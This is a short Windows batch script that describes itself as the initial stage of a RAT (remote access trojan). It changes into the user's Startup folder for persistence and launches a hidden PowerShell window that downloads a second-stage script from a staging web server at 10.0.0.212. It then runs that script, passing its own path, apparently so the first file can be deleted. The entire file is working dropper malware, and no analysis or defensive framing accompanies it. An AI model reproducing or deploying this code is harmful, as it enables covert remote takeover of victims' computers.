@REM intial stage for RAT
@REM created by : Moussa

@REM variables
set "FILE_NAME=phase1.cmd"
set "INITIAL_PATH=%cd%"
set "STARTUP_PATH=C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

@REM move into startup directory
cd %STARTUP_PATH%

@REM get phase2 from local web server to victim machine
powershell -WindowStyle Hidden -c "Invoke-WebRequest -Uri http://10.0.0.212/staging/phase2.cmd -Outfile phase2.cmd"

@REM run phase2 & remove initial file
call phase2.cmd %INITIAL_PATH%\%FILE_NAME%"

